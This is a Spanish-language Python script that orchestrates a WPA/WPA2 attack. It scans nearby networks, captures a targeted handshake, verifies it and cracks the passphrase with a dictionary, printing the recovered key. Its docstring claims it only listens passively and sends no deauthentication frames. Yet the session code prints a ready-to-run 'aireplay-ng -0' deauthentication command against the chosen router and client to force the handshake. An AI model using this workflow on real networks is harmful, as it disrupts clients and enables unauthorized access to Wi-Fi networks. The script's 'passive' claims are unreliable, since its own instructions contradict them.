"""Auditoría WPA/WPA2 de laboratorio: una sesión nueva por ejecución.

Solo escucha pasivamente. No envía tramas de desautenticación.
No guarda informes ni historiales; las capturas auxiliares se borran al terminar
cada intento. Requiere las versiones probadas de los módulos del proyecto.
"""
from __future__ import annotations

import argparse
import contextlib
import signal
import os
import re
import shutil
import subprocess
import sys
import time
from pathlib import Path

from monitor_mode import iniciar_modo_monitor
from escaneo import escanear_redes
from ataque import (
    iniciar_captura_dirigida,
    detener_captura,
    ruta_captura,
    diagnosticar_pcap,
)
from handshake import confirmar_handshake
from cracking import crackear

BASE = Path(__file__).resolve().parent
DICCIONARIOS = BASE / "diccionarios"
# Prefijo reservado exclusivamente para este controlador.
PREFIJO = "auditoria_tmp"
SUFIJOS_TEMPORALES = (
    ".cap", ".csv", ".kismet.csv", ".kismet.netxml",
    ".log.csv", ".airodump.log", "-airodump.log",
)


@contextlib.contextmanager
def proteger_cierre():
    """Pospone nuevas interrupciones mientras se cierran procesos/temporales.

    Se utiliza únicamente en el hilo principal. La primera pulsación Ctrl+C
    sigue cancelando la captura; pulsaciones posteriores no interrumpen el cierre.
    """
    anterior = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    try:
        yield
    finally:
        signal.signal(signal.SIGINT, anterior)


def seleccionar(total: int, mensaje: str) -> int:
    if total <= 0:
        raise ValueError("No hay opciones disponibles")
    while True:
        respuesta = input(f"{mensaje} [0-{total - 1}, q para salir]: ").strip().lower()
        if respuesta == "q":
            raise KeyboardInterrupt
        if respuesta.isdecimal() and 0 <= int(respuesta) < total:
            return int(respuesta)
        print("[AVISO] Debes seleccionar un índice válido.")


def limpiar_temporales() -> int:
    """Elimina *solo* los archivos creados con el prefijo reservado.

    No sigue enlaces simbólicos a carpetas ni borra capturas manuales.
    """
    carpeta = BASE / "capturas_ataque"
    if carpeta.is_symlink() or not carpeta.is_dir():
        return 0
    eliminados = 0
    for archivo in carpeta.iterdir():
        if (archivo.name.startswith(PREFIJO + "-")
                and archivo.name.endswith(SUFIJOS_TEMPORALES)
                and (archivo.is_file() or archivo.is_symlink())):
            archivo.unlink()
            eliminados += 1
    return eliminados


def comprobar_dependencias() -> None:
    """Verifica herramientas sin cambiar el estado del adaptador."""
    necesarias = ('iw', 'airmon-ng', 'airodump-ng', 'aircrack-ng', 'tshark')
    ausentes = [programa for programa in necesarias if shutil.which(programa) is None]
    if ausentes:
        raise RuntimeError('Faltan herramientas necesarias: ' + ', '.join(ausentes))
    print('[OK] Herramientas del laboratorio disponibles.')


def elegir_red(redes: list[dict]) -> dict:
    if not redes:
        raise RuntimeError("No se detectaron redes; revisa la antena y vuelve a intentar.")
    print("\nREDES DETECTADAS")
    for i, red in enumerate(redes):
        print(f"[{i}] {red.get('essid') or '<SSID oculto>'} "
              f"(canal {red.get('canal') or '?'}, "
              f"{red.get('cifrado') or 'sin identificar'}, {red.get('bssid')})")
    return redes[seleccionar(len(redes), "Selecciona tu red de laboratorio")]


def elegir_estacion(estaciones: list[dict], bssid: str) -> str | None:
    asociadas = [est for est in estaciones
                 if str(est.get("bssid_conectado", "")).lower() == bssid.lower()]
    if not asociadas:
        print("[INFO] No se observaron estaciones asociadas a este BSSID durante el escaneo.")
        print("[INFO] Esto no impide continuar con la captura pasiva.")
        return None
    print("\nESTACIONES OBSERVADAS (selección informativa)")
    print("[INFO] La estación elegida no altera el filtro de la captura: se utiliza el BSSID.")
    for i, est in enumerate(asociadas):
        print(f"[{i}] {est.get('mac_cliente', '?')}")
    print(f"[{len(asociadas)}] Omitir")
    indice = seleccionar(len(asociadas) + 1, "Selecciona una opción")
    
    if indice == len(asociadas):
        return None

    return asociadas[indice]["mac_cliente"]


def elegir_diccionario() -> Path | None:
    # No modificamos ni borramos los diccionarios del usuario.
    archivos = sorted(p for p in DICCIONARIOS.glob("*.txt")
                      if p.is_file() and p.stat().st_size > 0) if DICCIONARIOS.is_dir() else []
    if not archivos:
        print("[AVISO] No hay diccionarios .txt no vacíos en 'diccionarios'.")
        return None
    print("\nDICCIONARIOS DISPONIBLES")
    for i, archivo in enumerate(archivos):
        print(f"[{i}] {archivo.name}")
    print(f"[{len(archivos)}] Omitir análisis")
    indice = seleccionar(len(archivos) + 1, "Selecciona el diccionario")
    return archivos[indice] if indice < len(archivos) else None


def mostrar_resultado(tiempos: dict, diagnostico: dict | None,
                      confirmado: bool, resultado: dict | None,
                      diccionario: Path | None) -> None:
    """Presenta solo en la consola: no crea ningún archivo de informe."""
    print("\n" + "=" * 55)
    print("RESULTADOS DE LA SESIÓN WPA/WPA2")
    print("=" * 55)
    print(f"Escaneo:              {tiempos['escaneo']:.1f} s")
    print(f"Captura:              {tiempos['captura']:.1f} s")
    print(f"Análisis:             {tiempos['analisis']:.1f} s")
    if diagnostico is not None:
        print(f"Tramas:               {diagnostico.get('tramas')}")
        print(f"EAPOL:                {diagnostico.get('eapol')}")
        print(f"PCAP truncado:        {'Sí' if diagnostico.get('truncado') else 'No'}")
        if diagnostico.get("error"):
            print(f"Aviso:                {diagnostico['error']}")
    print(f"Handshake confirmado: {'Sí' if confirmado else 'No'}")
    print(f"Diccionario:          {diccionario.name if diccionario else 'No utilizado'}")
    if resultado is not None:
        print(f"Candidatas probadas:  {resultado.get('claves_probadas')}")
        print(f"Coincidencia:         {'Sí' if resultado.get('encontrada') else 'No'}")
        # Solo mostrar el resultado positivo en la consola; nunca guardarlo.
        if resultado.get('encontrada') and resultado.get('contrasena'):
            print(f"KEY FOUND:            {resultado['contrasena']}")
    else:
        print("Análisis de claves:   No ejecutado")
    print("=" * 55)


def contar_eapol_provisional(ruta: Path, timeout: float = 4.0) -> int | None:
    """Cuenta EAPOL visibles en el PCAP mientras se escribe.

    La lectura concurrente puede ser incompleta o fallar: None significa
    «no disponible», nunca «cero». No confirma un handshake.
    """
    try:
        if not ruta.is_file() or ruta.stat().st_size == 0:
            return None
        consulta = subprocess.run(
            ["tshark", "-n", "-r", str(ruta), "-Y", "eapol",
             "-T", "fields", "-e", "frame.number"],
            capture_output=True, text=True, errors="replace",
            stdin=subprocess.DEVNULL, timeout=timeout, check=False,
        )
        # Una lectura simultánea de un PCAP aún abierto puede devolver datos
        # parciales o errores; no presentar esas lecturas como definitivas.
        if consulta.returncode != 0:
            return None
        return len(consulta.stdout.splitlines())
    except (OSError, subprocess.TimeoutExpired):
        return None


def capturar_un_minuto(interfaz: str, bssid: str, canal: int,
                       duracion: int) -> tuple[Path, float]:
    """Captura durante 'duracion' segundos; el handshake se verifica al cerrar."""
    proceso = maestro = None
    inicio = time.monotonic()
    try:
        proceso, maestro = iniciar_captura_dirigida(interfaz, bssid, str(canal), PREFIJO)
        ruta = Path(ruta_captura(PREFIJO))
        print(f"\n[INFO] Capturando durante {duracion} segundos...")
        siguiente_aviso = 10
        while True:
            if proceso.poll() is not None:
                raise RuntimeError("Airodump-ng terminó inesperadamente durante la captura")
            transcurrido = time.monotonic() - inicio
            if transcurrido >= duracion:
                break
            if transcurrido >= siguiente_aviso:
                print(f"[INFO] Capturando... {min(int(transcurrido), duracion)}/{duracion} s")
                siguiente_aviso += 10
            time.sleep(min(0.5, max(0.05, duracion - transcurrido)))
        return ruta, time.monotonic() - inicio
    except KeyboardInterrupt:
        print("\n[INFO] Interrupción solicitada durante la captura.")
        raise
    finally:
        if proceso is not None and maestro is not None:
            with proteger_cierre():
                detener_captura(proceso, maestro)
            print("[OK] Captura finalizada.")


def ejecutar_sesion(interfaz: str, duracion_escaneo: int = 30,
                    duracion_captura: int = 60) -> bool:
    """Devuelve True si se confirmó handshake; False permite reintentar."""
    tiempos = {"escaneo": 0.0, "captura": 0.0, "analisis": 0.0}
    limpiar_temporales()
    try:
        inicio = time.monotonic()
        redes, estaciones = escanear_redes(interfaz, duracion_escaneo)
        tiempos["escaneo"] = time.monotonic() - inicio
        print(f"\nEscaneo: {len(redes)} redes, {len(estaciones)} estaciones observadas.")
        red = elegir_red(redes)
        bssid = str(red.get("bssid", ""))
        canal = str(red.get("canal", ""))
        cifrado = str(red.get("cifrado", "")).upper()
        if not re.fullmatch(r"(?:[A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}", bssid):
            raise ValueError("La red no tiene un BSSID válido")
        if not canal.isdigit() or not 1 <= int(canal) <= 165:
            raise ValueError("La red no tiene un canal válido")
        if "WPA" not in cifrado:
            raise ValueError("Selecciona una red WPA/WPA2 de laboratorio")
        estacion_seleccionada = elegir_estacion(estaciones, bssid)
        print(f"\nRed seleccionada: {red.get('essid')} / {bssid} / canal {canal}")
        print(f"MAC del router (BSSID): {bssid}")
        if estacion_seleccionada is not None:
            mac_cliente = estacion_seleccionada
            print(f"MAC del dispositivo seleccionado: {mac_cliente}")
        else:
            print("MAC del dispositivo seleccionado: Ninguno")
        print("[INFO] La selección del cliente es informativa; la captura permanece pasiva.")
        
        if estacion_seleccionada:
            print("\n[INFO] Cuando empiece la captura (verás 'Captura pasiva durante 60 segundos'),")
            print("[INFO] abre OTRA terminal y ejecuta este comando para forzar el handshake:")
            print(f"sudo aireplay-ng -0 10 --ignore-negative-one -a {bssid} -c {estacion_seleccionada} {interfaz}")
        else:
            print("\n[INFO] Cuando empiece la captura (verás 'Captura pasiva durante 60 segundos'),")
            print("[INFO] abre OTRA terminal y ejecuta este comando para forzar el handshake:")
            print(f"sudo aireplay-ng -0 10 --ignore-negative-one -a {bssid} {interfaz}")
        
        print("[INFO] La captura comenzará enseguida y durará un minuto.")

        ruta = None
        inicio_captura = time.monotonic()
        try:
            ruta, _ = capturar_un_minuto(interfaz, bssid, int(canal), duracion_captura)
        finally:
            tiempos["captura"] = time.monotonic() - inicio_captura
        diagnostico = diagnosticar_pcap(str(ruta))
        if diagnostico.get("error") or diagnostico.get("truncado"):
            print("[AVISO] La captura no es válida para continuar el análisis.")
            mostrar_resultado(tiempos, diagnostico, False, None, None)
            return False

        verificacion = confirmar_handshake(ruta, bssid)
        confirmado = bool(verificacion.get("confirmado"))
        print(f"\nHandshakes reconocidos para {bssid}: {verificacion.get('cantidad', 0)}")
        if not confirmado:
            print("[INFO] No se confirmó un handshake. Puedes reintentar desde cero.")
            mostrar_resultado(tiempos, diagnostico, False, None, None)
            return False

        diccionario = elegir_diccionario()
        resultado = None
        if diccionario is not None:
            print(f"[INFO] Analizando candidatos del diccionario {diccionario.name}...")
            inicio_analisis = time.monotonic()
            try:
                resultado = crackear(str(ruta), bssid, str(diccionario))
            finally:
                tiempos["analisis"] = time.monotonic() - inicio_analisis
        mostrar_resultado(tiempos, diagnostico, True, resultado, diccionario)
        return True
    finally:
        with proteger_cierre():
            eliminados = limpiar_temporales()
        if eliminados:
            print(f"[INFO] Eliminados {eliminados} archivos temporales de esta sesión.")


def argumentos():
    parser = argparse.ArgumentParser(description="Laboratorio WPA/WPA2: auditoría desde cero")
    parser.add_argument("--interfaz", default="wlan0")
    parser.add_argument("--duracion-escaneo", type=int, default=60)
    parser.add_argument("--duracion-captura", type=int, default=60)
    args = parser.parse_args()
    if not 1 <= args.duracion_escaneo <= 3600:
        parser.error("--duracion-escaneo debe estar entre 1 y 3600")
    if not 1 <= args.duracion_captura <= 3600:
        parser.error("--duracion-captura debe estar entre 1 y 3600")
    return args


def main() -> int:
    try:
        args = argumentos()
        print("\n========================================")
        print("       AUDITORÍA WPA/WPA2")
        print("========================================")
        print("[0] Iniciar auditoría completa")
        print("[1] Salir")
        if seleccionar(2, "Selecciona una opción") == 1:
            return 0
        if os.geteuid() != 0:
            raise PermissionError("Ejecuta el programa con sudo para capturar tráfico")
        comprobar_dependencias()
        interfaz = iniciar_modo_monitor(args.interfaz)
        while True:
            try:
                confirmado = ejecutar_sesion(interfaz, args.duracion_escaneo, args.duracion_captura)
            except (OSError, RuntimeError, ValueError) as exc:
                print(f"[ERROR] {exc}", file=sys.stderr)
                confirmado = False
            if confirmado:
                print("[OK] Auditoría finalizada.")
                return 0
            print("\n[0] Reintentar desde cero")
            print("[1] Finalizar")
            if seleccionar(2, "Selecciona una opción") == 1:
                return 0
    except (KeyboardInterrupt, EOFError):
        print("\n[INFO] Auditoría finalizada por el usuario.")
        return 0
    except (OSError, RuntimeError, ValueError) as exc:
        print(f"[ERROR] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())

        


        